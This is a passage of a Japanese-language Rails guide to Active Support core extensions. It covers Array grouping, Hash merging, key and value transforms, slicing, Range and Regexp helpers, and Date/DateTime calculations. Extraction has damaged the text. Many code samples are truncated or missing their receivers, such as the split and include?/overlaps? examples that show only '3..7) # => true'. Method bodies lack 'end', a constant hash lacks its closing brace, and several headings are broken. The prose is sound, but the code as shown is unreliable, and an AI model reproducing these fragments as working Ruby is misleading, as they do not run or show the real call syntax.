最初の例では、`in_groups_of`メソッドは最後のグループをなるべく`nil`要素で埋め、指定のサイズを満たすようにしています。
空きを埋める値は2番目のオプション引数で指定できます。
[1, 2, 3].in_groups_of(2, 0) # => [[1, 2], [3, 0]]
2番目のオプション引数に`false`を渡すと、最後のグループの空きは詰められます。
[1, 2, 3].in_groups_of(2, false) # => [[1, 2], [3]]
従って、`false`は空きを埋める値としては使用できません。
NOTE: 定義ファイルの場所は`active_support/core_ext/array/grouping.rb`です。
#### `in_groups(number, fill_with = nil)`
`in_groups`は、配列を指定の個数のグループに分割します。
分割されたグループを内包する配列を1つ返します。
%w(1 2 3 4 5 6 7).in_groups(3)
# => [["1", "2", "3"], ["4", "5", nil], ["6", "7", nil]]
%w(1 2 3 4 5 6 7).in_groups(3) {|group| p group}
["1", "2", "3"]
["4", "5", nil]
["6", "7", nil]
この例では、`in_groups`メソッドは一部のグループの後ろを必要に応じて`nil`要素で埋めているのがわかります。
また、そのような値を持つグループは、常に全体の中で最後のグループになります。
%w(1 2 3 4 5 6 7).in_groups(3, "0")
# => [["1", "2", "3"], ["4", "5", "0"], ["6", "7", "0"]]
2番目のオプション引数に`false`を渡すと、要素の個数の少ないグループの空きは詰められます。
%w(1 2 3 4 5 6 7).in_groups(3, false)
# => [["1", "2", "3"], ["4", "5"], ["6", "7"]]
#### `split(value = nil)`
`split`メソッドは、指定のセパレータで配列を分割し、分割されたチャンクを返します。
ブロックを渡した場合、配列の要素のうちブロックがtrueを返す要素がセパレータとして使用されます。
(-5..5).to_a.split { |i| i.multiple_of?(
# => [[-5], [-3, -2, -1], [1, 2, 3], [5]]
ブロックを渡さない場合、引数として受け取った値がセパレータとして使用されます。デフォルトのセパレータは`nil`です。
[0, 1, -5, 1, 1, "foo", "bar"].split(1)
# => [[0], [-5], [], ["foo", "bar"]]
TIP: 上の例からもわかるように、セパレータが連続すると空の配列になります。
`Hash`の拡張
{"foo" => 1, "bar" => 2}.to_xml
# <hash>
#   <foo type="integer">1</foo>
#   <bar type="integer">2</bar>
# </hash>
具体的には、このメソッドは与えられたペアから _値_ に応じてノードを作成します。
キーと値のペアが与えられたとき、以下のように動作します。
* 値がハッシュのとき、キーを`:root`として再帰的な呼び出しを行います。
* 値が配列の場合、キーを`:root`に、キーを単数形化 (singularize) したものを`:children`に指定して再帰的な呼び出しを行います。
* 値が呼び出し可能な (callable) オブジェクトの場合、引数が1つまたは2つ必要です。
引数の数に応じて (arityメソッドで確認)、呼び出し可能オブジェクトを呼び出します。第1引数には`:root`にキーを指定したもの、第2引数にはキーを単数形化したものが使用されます。
戻り値は新しいノードです。
* `value`が`to_xml`メソッドに応答する場合、`:root`にキーが指定されます。
* その他の場合、`key`を持ち、ノードがタグとして作成されます。そのノードには`value`を文字列形式にしたものがテキストノードとして追加されます。
`value`が`nil`の場合、"nil"属性が"true"に設定されたものが追加されます。
`:skip_types`オプションがtrueでない (または`:skip_types`オプションがない) 場合、以下のようなマッピングで"type"属性も追加されます。
XML_TYPE_NAMES = {
  "Symbol"     => "symbol",
  "BigDecimal" => "decimal",
  "Float"      => "float",
  "TrueClass"  => "boolean",
  "FalseClass" => "boolean",
  "Date"       => "date",
  "DateTime"   => "datetime",
  "Time"       => "datetime"
デフォルトではルートノードは"hash"ですが、`:root`オプションを使用してカスタマイズできます。
`:builder`オブションを使用することで、独自のビルダを構成できます。
このメソッドでは`:dasherize`とその同族と同様のオプションが使用できます。それらのオプションはビルダに転送されます。
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/conversions.rb`です。
### マージ
Rubyには、2つのハッシュをマージするビルトインの`Hash#merge`メソッドがあります。
{a: 1, b: 1}.merge(a: 0, c: 2)
# => {:a=>0, :b=>1, :c=>2}
Active Supportでは、この他にも便利なハッシュのマージをいくつか提供しています。
#### `reverse_merge`と`reverse_merge!
キーが衝突した場合、引数のハッシュのキーが`merge`では優先されます。
以下のような定形の手法を使用することで、デフォルト値を持つオプションハッシュをコンパクトにサポートできます。
options = {length: 30, omission: "..."}.merge(options)
Active Supportでは、別の記法を使いたい場合のために`reverse_merge`も定義されています。
options = options.reverse_merge(length: 30, omission: "...")
マージを対象内で行なう破壊的なバージョンの`reverse_merge!`もあります。
length: 30, omission: "...")
WARNING: `reverse_merge!`は呼び出し元のハッシュを変更する可能性があることにご注意ください。それが意図した副作用であるかそうでないかにかかわらず、注意が必要です。
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/reverse_merge.rb`です。
#### `reverse_update`
`reverse_update`メソッドは、上で説明した`reverse_merge!`の別名です。
WARN: `reverse_update`には破壊的なバージョンはありません。
#### `deep_merge`と`deep_merge!
先の例で説明したとおり、キーがレシーバと引数で重複している場合、引数の側の値が優先されます。
Active Supportでは`Hash#deep_merge`が定義されています。
ディープマージでは、レシーバと引数の両方に同じキーが出現し、さらにどちらも値がハッシュである場合に、その下位のハッシュを _マージ_ したものが、最終的なハッシュで値として使用されます。
{a: {b: 1}}.deep_merge(a: {c: 2})
# => {:a=>{:b=>1, :c=>2}}
`deep_merge!`メソッドはディープマージを破壊的に実行します。
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/deep_merge.rb`です。
### ディープ複製
`Hash.deep_dup`メソッドは、自分自身の複製に加えて その中のすべてのキーと値を再帰的に複製します。複製にはActive Supportの`Object#deep_dup`メソッドを使用しています。
この動作は、`Enumerator#each_with_object`を使用して下位のすべてのオブジェクトに`deep_dup`を送信するのと似ています。
hash = { a: 1, b: { c: 2, d: [3, 4] } }
dup = hash.deep_dup
dup[:b][:e] = 5
dup[:b][:d] << 5
hash[:b][:e] == nil      # => true
hash[:b][:d] == [3, 4]   # => true
### ハッシュキーの操作
#### `except`と`except!
`except`メソッドは、引数で指定されたキーがあればレシーバのハッシュから取り除きます。
{a: 1, b: 2}.except(:a) # => {:b=>2}
レシーバが`convert_key`に応答する場合、このメソッドはすべての引数に対して呼び出されます。
そのおかげで、`except`メソッドはたとえばwith_indifferent_accessなどで期待どおりに動作します。
{a: 1}.with_indifferent_access.except(:a)  # => {}
{a: 1}.with_indifferent_access.except("a") # => {}
レシーバーからキーを取り除く破壊的な`except!`もあります。
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/except.rb`です。
#### `transform_keys`と`transform_keys!
`transform_keys`メソッドは、ブロックを1つ取り、ハッシュを1つ返します。返されるハッシュには、レシーバのそれぞれのキーに対してブロック操作を適用した結果が含まれます。
{nil => nil, 1 => 1, a: :a}.transform_keys { |key| key.to_s.upcase }
# => {"" => nil, "A" => :a, "1" => 1}
キーが重複している場合、いずれかの値が優先されます。
優先される値は、同じハッシュが与えられた場合であっても一定する保証はありません。
{"a" => 1, a: 2}.transform_keys { |key| key.to_s.upcase }
# 以下のどちらになるかは一定ではない
# => {"A"=>2}
# => {"A"=>1}
このメソッドは、特殊な変換を行いたい場合に便利なことがあります。
たとえば、`stringify_keys`と`symbolize_keys`では、キーの変換に`transform_keys`を使用しています。
def stringify_keys
  transform_keys { |key| key.to_s }
def symbolize_keys
  transform_keys { |key| key.to_sym rescue key }
レシーバ自体のキーに対して破壊的なブロック操作を適用する`transform_keys!`メソッドもあります。
また、`deep_transform_keys`や`deep_transform_keys!`を使用して、与えられたハッシュのすべてのキーと、その中にネストされているすべてのハッシュに対してブロック操作を適用することもできます。
以下に例を示します。
{nil => nil, 1 => 1, nested: {a: 3, 5 => 5}}.deep_transform_keys { |key| key.to_s.upcase }
# => {""=>nil, "1"=>1, "NESTED"=>{"A"=>3, "5"=>5}}
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/keys.rb`です。
#### `stringify_keys`と`stringify_keys!
`stringify_keys`メソッドは、レシーバのハッシュキーを文字列に変換したハッシュを返します。
具体的には、レシーバのハッシュキーに対して`to_s`を送信しています。
{nil => nil, 1 => 1, a: :a}.stringify_keys
# => {"" => nil, "a" => :a, "1" => 1}
{"a" => 1, a: 2}.stringify_keys
# => {"a"=>2}
# => {"a"=>1}
このメソッドは、シンボルと文字列が両方含まれているハッシュをオプションとして受け取る場合に便利なことがあります。
たとえば、`ActionView::Helpers::FormHelper`では以下のように定義されています。
def to_check_box_tag(options = {}, checked_value = "1", unchecked_value = "0")
  options = options.stringify_keys
  options["type"] = "checkbox"
stringify_keysメソッドのおかげで、2行目で"type"キーに安全にアクセスできます。メソッドの利用者は、`:type`のようなシンボルと"type"のような文字列のどちらでも使用できます。
レシーバーのキーを直接文字列化する破壊的な`stringify_keys!`もあります。
また、`deep_stringify_keys`や`deep_stringify_keys!`を使用して、与えられたハッシュのすべてのキーを文字列化し、その中にネストされているすべてのハッシュのキーも文字列化することもできます。
{nil => nil, 1 => 1, nested: {a: 3, 5 => 5}}.deep_stringify_keys
# => {""=>nil, "1"=>1, "nested"=>{"a"=>3, "5"=>5}}
#### `symbolize_keys`と`symbolize_keys!
`symbolize_keys`メソッドは、レシーバのハッシュキーをシンボルに変換したハッシュを返します。
具体的には、レシーバのハッシュキーに対して`to_sym`を送信しています。
{nil => nil, 1 => 1, "a" => "a"}.symbolize_keys
# => {1=>1, nil=>nil, :a=>"a"}
WARNING: 上の例では、3つのキーのうち最後の1つしかシンボルに変換されていないことにご注意ください。数字とnilはシンボルになりません。
{"a" => 1, a: 2}.symbolize_keys
# => {:a=>2}
# => {:a=>1}
たとえば、`ActionController::UrlRewriter`では以下のように定義されています。
def rewrite_path(options)
  options = options.symbolize_keys
  options.update(options[:params].symbolize_keys) if options[:params]
symbolize_keysメソッドのおかげで、2行目で`:params`キーに安全にアクセスできています。メソッドの利用者は、`:params`のようなシンボルと"params"のような文字列のどちらでも使用できます。
レシーバーのキーを直接シンボルに変換する破壊的な`symbolize_keys!`もあります。
また、`deep_symbolize_keys`や`deep_symbolize_keys!`を使用して、与えられたハッシュのすべてのキーと、その中にネストされているすべてのハッシュのキーをシンボルに変換することもできます。
{nil => nil, 1 => 1, "nested" => {"a" => 3, 5 => 5}}.deep_symbolize_keys
# => {nil=>nil, 1=>1, nested:{a:3, 5=>5}}
#### `to_options`と`to_options!
`to_options`メソッドと`to_options!`メソッドは、それそれ`symbolize_keys`メソッドと`symbolize_keys!`メソッドの別名です。
#### `assert_valid_keys`
`assert_valid_keys`メソッドは任意の数の引数を取ることができ、ホワイトリストに含まれていないキーがレシーバにあるかどうかをチェックします。
そのようなキーが見つかった場合、`ArgumentError`が発生します。
{a: 1}.assert_valid_keys(:a)  # パスする
{a: 1}.assert_valid_keys("a") # ArgumentError
Active Recordは、たとえば関連付けが行われている場合に未知のオプションを受け付けません。
このメソッドでは、`assert_valid_keys`を使用した制御を実装しています。
### 値の操作
#### `transform_values`と`transform_values!`
`transform_values`メソッドは、ブロックを1つ取り、ハッシュを1つ返します。返されるハッシュには、レシーバのそれぞれの値に対してブロック操作を適用した結果が含まれます。
{ nil => nil, 1 => 1, :x => :a }.transform_values { |value| value.to_s.upcase }
# => {nil=>"", 1=>"1", :x=>"A"}
レシーバ自体のキーに対して破壊的なブロック操作を適用する`transform_values!`メソッドもあります。
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/transform_values.rb`です。
### スライス
Rubyには、文字列や配列をスライスして一部を取り出すビルトインのメソッドをサポートしています。
Active Supportでは、スライス操作をハッシュに対して拡張しています。
{a: 1, b: 2, c: 3}.slice(:a, :c)
# => {:c=>3, :a=>1}
{a: 1, b: 2, c: 3}.slice(:b, :X)
# => {:b=>2} # 存在しないキーは無視される
レシーバが`convert_key`に応答する場合、キーは正規化されます。
{a: 1, b: 2}.with_indifferent_access.slice("a")
NOTE: スライス処理は、キーのホワイトリストを使用してオプションハッシュをサニタイズするのに便利です。
破壊的なスライス操作を行なう`slice!`メソッドもあります。戻り値は、取り除かれた要素です。
hash = {a: 1, b: 2}
rest = hash.slice!(:a) # => {:b=>2}
hash                   # => {:a=>1}
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/slice.rb`です。
### 抽出
`extract!`メソッドは、与えられたキーにマッチするキー/値ペアを取り除き、取り除いたペアを返します。
rest = hash.extract!(:a) # => {:a=>1}
hash                     # => {:b=>2}
`extract!`メソッドは、レシーバのハッシュのサブクラスと同じサブクラスを返します。
hash = {a: 1, b: 2}.with_indifferent_access
rest = hash.extract!(:a).class
# => ActiveSupport::HashWithIndifferentAccess
### ハッシュキーがシンボルでも文字列でも同様に扱う (indifferent access)
`with_indifferent_access`メソッドは、レシーバに対して`ActiveSupport::HashWithIndifferentAccess`を実行した結果を返します。
{a: 1}.with_indifferent_access["a"] # => 1
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/indifferent_access.rb`です。
### コンパクト化
`compact`メソッドと`compact!`メソッドは、ハッシュから`nil`値を除外したものを返します。
{a: 1, b: 2, c: nil}.compact # => {a: 1, b: 2}
NOTE: 定義ファイルの場所は`active_support/core_ext/hash/compact.rb`です。
`Regexp`の拡張
### `multiline?
`multiline?`メソッドは、正規表現に`/m`フラグが設定されているかどうかをチェックします。このフラグが設定されていると、ドット (.) が改行にマッチし、複数行を扱えるようになります。
%r{.}m.multiline? 
Regexp.new('.').multiline?                    
Regexp.new('.', Regexp::MULTILINE).multiline? 
Railsはこのメソッドをある場所で使用しており、ルーティングコードでも使用しています。
ルーティングでは正規表現で複数行を扱うことを許していないので、このフラグを使用して制限を加えています。
def assign_route_options(segments, defaults, requirements)
  if requirement.multiline?
    raise ArgumentError, "Regexp multiline option not allowed in routing requirements: #{requirement.inspect}"
NOTE: 定義ファイルの場所は`active_support/core_ext/regexp.rb`です。
`Range`の拡張
Active Supportは`Range#to_s`メソッドを拡張してフォーマット引数をオプションで受け付けるようにしています。
執筆時点では、デフォルトでないフォーマットとしてサポートされているのは`:db`のみです。
# => "2009-10-25..2009-10-26"
# => "BETWEEN '2009-10-25' AND '2009-10-26'"
上の例でもわかるように、フォーマットに`:db`を指定するとSQLの`BETWEEN`句が生成されます。
このフォーマットは、Active Recordで条件の値の範囲をサポートするときに使用されています。
NOTE: 定義ファイルの場所は`active_support/core_ext/range/conversions.rb`です。
### `include?
`Range#include?`メソッドと`Range#===`メソッドは、与えられたインスタンスの範囲内に値が収まっているかどうかをチェックします。
(2..3).include?(Math::E) # => true
Active Supportではこれらのメソッドを拡張して、他の範囲指定を引数で指定できるようにしています。
この場合、引数の範囲がレシーバの範囲の中に収まっているかどうかがチェックされています。
3..7)  # => true
0..7)  # => false
3..11) # => false
3..9)  # => false
(1..10) === (3..7)  # => true
(1..10) === (0..7)  # => false
(1..10) === (3..11) # => false
(1...9) === (3..9)  # => false
NOTE: 定義ファイルの場所は`active_support/core_ext/range/include_range.rb`です。
### `overlaps?
`Range#overlaps?`メソッドは、与えられた2つの範囲に(空白でない)重なりがあるかどうかをチェックします。
7..11)  # => true
0..7)   # => true
11..27) # => false
NOTE: 定義ファイルの場所は`active_support/core_ext/range/overlaps.rb`です。
`Date`の拡張
### 計算
NOTE: これらはすべて同じ定義ファイル`active_support/core_ext/date/calculations.rb`にあります。
INFO: 以下の計算方法の一部では1582年10月を極端な例として使用しています。この月にユリウス暦からグレゴリオ暦への切り替えが行われたため、10月5日から10月14日までが存在しません。
本ガイドはこの特殊な月について長々と解説することはしませんが、メソッドがこの月でも期待どおりに動作することについては説明しておきたいと思います。
具体的には、たとえば`Date.new(1582, 10, 4).tomorrow`を実行すると`Date.new(1582, 10, 15)`が返されます。
期待どおりに動作することは、Active Supportの`test/core_ext/date_ext_test.rb`用のテストスイートで確認できます。
#### `Date.current`
Active Supportでは、`Date.current`を定義して現在のタイムゾーンにおける「今日」を定めています。
このメソッドは`Date.today`と似ていますが、ユーザー定義のタイムゾーンがある場合にそれを考慮する点が異なります。
Active Supportでは`Date.yesterday`メソッドと`Date.tomorrow`も定義しています。インスタンスでは`past?`、`today?`、`future?`を使用でき、これらはすべて`Date.current`を起点として導かれます。
ユーザー定義のタイムゾーンを考慮するメソッドを使用して日付を比較したい場合、`Date.today`ではなく必ず`Date.current`を使用してください。
将来、ユーザー定義のタイムゾーンがシステムのタイムゾーンと比較されることがありえます。システムのタイムゾーンではデフォルトで`Date.today`が使用されます。
つまり、`Date.today`が`Date.yesterday`と等しくなることがありえるということです。
#### 名前付き日付
##### `prev_year`、`next_year`
Ruby 1.9の`prev_year`メソッドと`next_year`メソッドは、それぞれ昨年と来年の同じ日と月を返します。
d = Date.new(2010, 5, 8) # => Sat, 08 May 2010
d.prev_year              # => Fri, 08 May 2009
d.next_year              # => Sun, 08 May 2011
うるう年の2月29日の場合、昨年と来年の日付はいずれも2月28日になります。
d = Date.new(2000, 2, 29) # => Tue, 29 Feb 2000
d.prev_year               # => Sun, 28 Feb 1999
d.next_year               # => Wed, 28 Feb 2001
`prev_year`は`last_year`の別名です。
##### `prev_month`、`next_month`
Ruby 1.9の`prev_month`メソッドと`next_month`メソッドは、それぞれ先月と翌月の同じ日を返します。
d.prev_month             # => Thu, 08 Apr 2010
d.next_month             # => Tue, 08 Jun 2010
同じ日が行き先の月にない場合、その月の最後の日が返されます。
Date.new(2000, 5, 31).prev_month # => Sun, 30 Apr 2000
Date.new(2000, 3, 31).prev_month # => Tue, 29 Feb 2000
Date.new(2000, 5, 31).next_month # => Fri, 30 Jun 2000
Date.new(2000, 1, 31).next_month # => Tue, 29 Feb 2000
`prev_month`は`last_month`の別名です。
##### `prev_quarter`、`next_quarter`
`prev_month`および`next_month`と基本的に同じ要領で動作します。
前四半期または来四半期の同じ日の日付を返します。
t = Time.local(2010, 5, 8) # => Sat, 08 May 2010
t.prev_quarter             # => Mon, 08 Feb 2010
t.next_quarter             # => Sun, 08 Aug 2010
Time.local(2000, 7, 31).prev_quarter  # => Sun, 30 Apr 2000
Time.local(2000, 5, 31).prev_quarter  # => Tue, 29 Feb 2000
Time.local(2000, 10, 31).prev_quarter # => Mon, 30 Oct 2000
Time.local(2000, 11, 31).next_quarter # => Wed, 28 Feb 2001
`prev_quarter`は`last_quarter`の別名です。
##### `beginning_of_week`、`end_of_week`
`beginning_of_week`メソッドと`end_of_week`メソッドは、それぞれ週の最初の日付と週の最後の日付を返します。
週の始まりはデフォルトでは月曜日ですが、引数を渡して変更できます。そのときにスレッドローカルの`Date.beginning_of_week`または`config.beginning_of_week`を設定します。
d = Date.new(2010, 5, 8)     # => Sat, 08 May 2010
d.beginning_of_week          # => Mon, 03 May 2010
d.beginning_of_week(:sunday) # => Sun, 02 May 2010
d.end_of_week                # => Sun, 09 May 2010
d.end_of_week(:sunday)       # => Sat, 08 May 2010
`beginning_of_week`は`at_beginning_of_week`の別名、`end_of_week`は`at_end_of_week`の別名です。
##### `monday`、`sunday`
`monday`メソッドと`sunday`メソッドは、それぞれ前の月曜、次の日曜をそれぞれ返します。
d.monday                     # => Mon, 03 May 2010
d.sunday                     # => Sun, 09 May 2010
d = Date.new(2012, 9, 10)    # => Mon, 10 Sep 2012
d.monday                     # => Mon, 10 Sep 2012
d = Date.new(2012, 9, 16)    # => Sun, 16 Sep 2012
d.sunday                     # => Sun, 16 Sep 2012
##### `prev_week`、`next_week`
`next_week`メソッドは、英語表記 (デフォルトではスレッドローカルの`Date.beginning_of_week`または`config.beginning_of_week`または`:monday`) の日付名のシンボルを受け取り、それに対応する日付を返します。
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.next_week              # => Mon, 10 May 2010
d.next_week(:saturday)   # => Sat, 15 May 2010
`prev_week`も同様です。
d.prev_week              # => Mon, 26 Apr 2010
d.prev_week(:saturday)   # => Sat, 01 May 2010
d.prev_week(:friday)     # => Fri, 30 Apr 2010
`prev_week`は`last_week`の別名です。
`Date.beginning_of_week`または`config.beginning_of_week`が設定されていれば、`next_week`と`prev_week`はどちらも正常に動作します。
##### `beginning_of_month`、`end_of_month`
`beginning_of_month`メソッドと`end_of_month`メソッドは、それぞれ月の最初の日付と月の最後の日付を返します。
d.beginning_of_month     # => Sat, 01 May 2010
d.end_of_month           # => Mon, 31 May 2010
`beginning_of_month`は`at_beginning_of_month`の別名、`end_of_month`は`at_end_of_month`の別名です。
##### `beginning_of_quarter`、`end_of_quarter`
`beginning_of_quarter`メソッドと`end_of_quarter`メソッドは、レシーバのカレンダーの年における四半期の最初の日と最後の日をそれぞれ返します。
d.beginning_of_quarter   # => Thu, 01 Apr 2010
d.end_of_quarter         # => Wed, 30 Jun 2010
`beginning_of_quarter`は`at_beginning_of_quarter`の別名、`end_of_quarter`は`at_end_of_quarter`の別名です。
##### `beginning_of_year`、`end_of_year`
`beginning_of_year`メソッドと`end_of_year`メソッドは、その年の最初の日と最後の日をそれぞれ返します。
d.beginning_of_year      # => Fri, 01 Jan 2010
d.end_of_year            # => Fri, 31 Dec 2010
`beginning_of_year`は`at_beginning_of_year`の別名、`end_of_year`は`at_end_of_year`の別名です。
#### その他の日付計算メソッド
##### `years_ago`、`years_since`
`years_ago`メソッドは、年数を受け取り、その年数前の同じ日付を返します。
date = Date.new(2010, 6, 7)
date.years_ago(10) # => Wed, 07 Jun 2000
`years_since`も同じ要領で、その年数後の同じ日付を返します。
date.years_since(10) # => Sun, 07 Jun 2020
Date.new(2012, 2, 29).years_ago(3)     # => Sat, 28 Feb 2009
Date.new(2012, 2, 29).years_since(3)   # => Sat, 28 Feb 2015
##### `months_ago`、`months_since`
`months_ago`メソッドと`months_since`メソッドは、上と同じ要領で月に対して行います。
Date.new(2010, 4, 30).months_ago(2)   # => Sun, 28 Feb 2010
Date.new(2010, 4, 30).months_since(2) # => Wed, 30 Jun 2010
Date.new(2010, 4, 30).months_ago(2)    # => Sun, 28 Feb 2010
Date.new(2009, 12, 31).months_since(2) # => Sun, 28 Feb 2010
##### `weeks_ago`
`weeks_ago`メソッドは、同じ要領で週に対して行います。
Date.new(2010, 5, 24).weeks_ago(1)    # => Mon, 17 May 2010
Date.new(2010, 5, 24).weeks_ago(2)    # => Mon, 10 May 2010
##### `advance`
日付を移動する最も一般的な方法は`advance`メソッドを使用することです。
このメソッドは`:years`、`:months`、`:weeks`、`:days`をキーに持つハッシュを受け取り、日付をできるだけ詳細な形式で、現在のキーで示されるとおりに返します。
date = Date.new(2010, 6, 6)
date.advance(years: 1, weeks: 2)  # => Mon, 20 Jun 2011
date.advance(months: 2, days: -2) # => Wed, 04 Aug 2010
上の例にも示されているように、増分値には負の数も指定できます。
計算の順序は、最初に年を増減し、次に月、最後に日を増減します。
この順序で計算していることは、特に月を計算する時に重要です。
たとえば、現在が2010年2月の最後の日で、そこから1か月と1日先に進めたいとします。
`advance`メソッドは最初に月を進め、それから日を進めます。それにより以下の結果を得ます。
Date.new(2010, 2, 28).advance(months: 1, days: 1)
# => Sun, 29 Mar 2010
計算の順序が異なる場合、同じ結果が得られない可能性があります。
Date.new(2010, 2, 28).advance(days: 1).advance(months: 1)
# => Thu, 01 Apr 2010
#### 要素の変更
`change`メソッドは、与えられた年、月、日に応じてレシーバの日付を変更し、与えられなかった部分はそのままにしてその日付を返します。
Date.new(2010, 12, 23).change(year: 2011, month: 11)
# => Wed, 23 Nov 2011
存在しない日付が指定されると`ArgumentError`が発生します。
Date.new(2010, 1, 31).change(month: 2)
# => ArgumentError: invalid date
#### 期間
日付に対して期間を加減算できます。
d = Date.current
# => Mon, 09 Aug 2010 
d + 1.year
# => Tue, 09 Aug 2011
d - 3.hours
# => Sun, 08 Aug 2010 21:00:00 UTC +00:00
これらの計算は、内部で`since`メソッドや`advance`メソッドに置き換えられます。
たとえば、作り直したカレンダー内で正しくジャンプできます。
Date.new(1582, 10, 4) + 1.day
# => Fri, 15 Oct 1582
#### タイムスタンプ
INFO: 以下のメソッドは可能であれば`Time`オブジェクトを返し、それ以外の場合は`DateTime`を返します。
ユーザーのタイムゾーンを設定しておけば配慮されます。
##### `beginning_of_day`、`end_of_day`
`beginning_of_day`メソッドは、その日の開始時点 (00:00:00) のタイムスタンプを返します。
date.beginning_of_day # => Mon Jun 07 00:00:00 +0200 2010
`end_of_day`メソッドは、その日の最後の時点 (23:59:59) のタイムスタンプを返します。
date.end_of_day # => Mon Jun 07 23:59:59 +0200 2010
##### `beginning_of_hour`、`end_of_hour`
`beginning_of_hour`メソッドは、その時の最初の時点 (hh:00:00) のタイムスタンプを返します。
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.beginning_of_hour # => Mon Jun 07 19:00:00 +0200 2010
`end_of_hour`メソッドは、その時の最後の時点 (hh:59:59) のタイムスタンプを返します。
date.end_of_hour # => Mon Jun 07 19:59:59 +0200 2010
`beginning_of_hour`は`at_beginning_of_hour`の別名です。
##### `beginning_of_minute`、`end_of_minute`
`beginning_of_minute`は、その分の最初の時点 (hh:mm:00) のタイムスタンプを返します。
date.beginning_of_minute # => Mon Jun 07 19:55:00 +0200 2010
`end_of_minute`メソッドは、その分の最後の時点 (hh:mm:59) のタイムスタンプを返します。
date.end_of_minute # => Mon Jun 07 19:55:59 +0200 2010
`beginning_of_minute`は`at_beginning_of_minute`の別名です。
INFO: `beginning_of_hour`、`end_of_hour`、`beginning_of_minute`、`end_of_minute`は`Time`および`DateTime`への実装ですが、`Date`への実装では **ありません** 。`Date`インスタンスに対して時間や分の最初や最後を問い合わせる意味はありません。
##### `ago`、`since`
`ago`メソッドは秒数を引数として受け取り、真夜中の時点からその秒数だけさかのぼった時点のタイムスタンプを返します。
date = Date.current # => Fri, 11 Jun 2010
date.ago(1)         # => Thu, 10 Jun 2010 23:59:59 EDT -04:00
`since`メソッドは、同様にその秒数だけ先に進みます。
date.since(1)       # => Fri, 11 Jun 2010 00:00:01 EDT -04:00
#### その他の時間計算
`DateTime`の拡張
WARNING: `DateTime`は夏時間 (DST) ルールについては関知しません。夏時間の変更が行われた場合、メソッドの一部がこのとおりに動作しないことがあります。
たとえば、`seconds_since_midnight`メソッドが返す秒数が実際の総量と合わない可能性があります。
NOTE: これらはすべて同じ定義ファイル`active_support/core_ext/date_time/calculations.rb`にあります。
`DateTime`クラスは`Date`のサブクラスであり、`active_support/core_ext/date/calculations.rb`を読み込むことでこれらのメソッドと別名を継承することができます。ただしこれらは常にdatetimesを返す点が異なります。
yesterday
beginning_of_week (at_beginning_of_week)
end_of_week (at_end_of_week)
monday
sunday
weeks_ago
prev_week (last_week)
next_week
months_ago
months_since
beginning_of_month (at_beginning_of_month)
end_of_month (at_end_of_month)
prev_month (last_month)
next_month
beginning_of_quarter (at_beginning_of_quarter)
end_of_quarter (at_end_of_quarter)
beginning_of_year (at_beginning_of_year)
end_of_year (at_end_of_year)
years_ago
years_since
prev_year (last_year)
next_year
以下のメソッドはすべて再実装されるため、これらを使用するために`active_support/core_ext/date/calculations.rb`を読み込む必要は **ありません** 。
beginning_of_day (midnight, at_midnight, at_beginning_of_day)
end_of_day
since (in)
他方、`advance`と`change`も定義されていますがこれらはさらに多くのオプションをサポートしています。これらについては後述します。
以下のメソッドは`active_support/core_ext/date_time/calculations.rb`にのみ実装されています。これらは`DateTime`インスタンスに対して使用しないと意味がないためです。
beginning_of_hour (at_beginning_of_hour)
end_of_hour
#### 名前付き日付時刻
##### `DateTime.current`
Active Supportでは、`DateTime.current`を`Time.now.to_datetime`と同様に定義しています。ただし、`DateTime.current`はユーザータイムゾーンが定義されている場合に対応する点が異なります。
Active Supportでは`Date.yesterday`メソッドと`Date.tomorrow`も定義しています。インスタンスでは`past?`と`future?`を使用でき、これらは`Date.current`を起点として導かれます。
#### その他の拡張
##### `seconds_since_midnight`
`seconds_since_midnight`メソッドは、真夜中からの経過秒数を返します。
now = DateTime.current     # => Mon, 07 Jun 2010 20:26:36 +0000
now.seconds_since_midnight # => 73596
##### `utc`
`utc`メソッドは、レシーバの日付時刻をUTCで返します。
now = DateTime.current # => Mon, 07 Jun 2010 19:27:52 -0400
now.utc                # => Mon, 07 Jun 2010 23:27:52 +0000
`getutc`はこのメソッドの別名です。
##### `utc?
`utc?`述語は、レシーバがそのタイムゾーンに合ったUTC時刻を持っているかどうかをチェックします。
now = DateTime.now # => Mon, 07 Jun 2010 19:30:47 -0400
 # => true
日時を移動する最も一般的な方法は`advance`メソッドを使用することです。
このメソッドは`:years`、`:months`、`:weeks`、`:days`、`:hours`、`:minutes`および`:seconds`をキーに持つハッシュを受け取り、日時をできるだけ詳細な形式で、現在のキーで示されるとおりに返します。
d = DateTime.current
# => Thu, 05 Aug 2010 11:33:31 +0000
d.advance(years: 1, months: 1, days: 1, hours: 1, minutes: 1, seconds: 1)
# => Tue, 06 Sep 2011 12:34:32 +0000
続いて、算出された時点までの経過秒数を元に`since`メソッドを呼び出し、時間を補正します。
この実行順序には意味があります。極端なケースでは、順序が変わると計算結果も異なる場合があります。
これは上の`Date#advance`で示した例で適用されます。相対的な時間の計算においても計算の順序は同様に重要です。
もし仮に日付部分を先に進め (前述したとおり、相対的な計算順序があります)、続いて時間の部分も先に進めると、以下のような計算結果が得られます。
d = DateTime.new(2010, 2, 28, 23, 59, 59)
# => Sun, 28 Feb 2010 23:59:59 +0000
d.advance(months: 1, seconds: 1)
# => Mon, 29 Mar 2010 00:00:00 +0000
今度は順序を変えて計算すると、結果が異なります。
d.advance(seconds: 1).advance(months: 1)
# => Thu, 01 Apr 2010 00:00:00 +0000
WARNING: `DateTime`は夏時間 (DST) を考慮しません。算出された時間が最終的に存在しない時間になっても警告やエラーは発生しません。
`change`メソッドを使用して、レシーバの日時の一部の要素だけを更新した新しい日時を得ることができます。変更する要素としては、`:year`、`:month`、`:day`、`:hour`、`:min`、`:sec`、`:offset`、`:start`などが指定できます。
now = DateTime.current
# => Tue, 08 Jun 2010 01:56:22 +0000
now.change(year: 2011, offset: Rational(-6, 24))
# => Wed, 08 Jun 2011 01:56:22 -0600
時 (hour) がゼロの場合、分と秒も値を与えられない限り同様にゼロになります。
now.change(hour: 0)
# => Tue, 08 Jun 2010 00:00:00 +0000
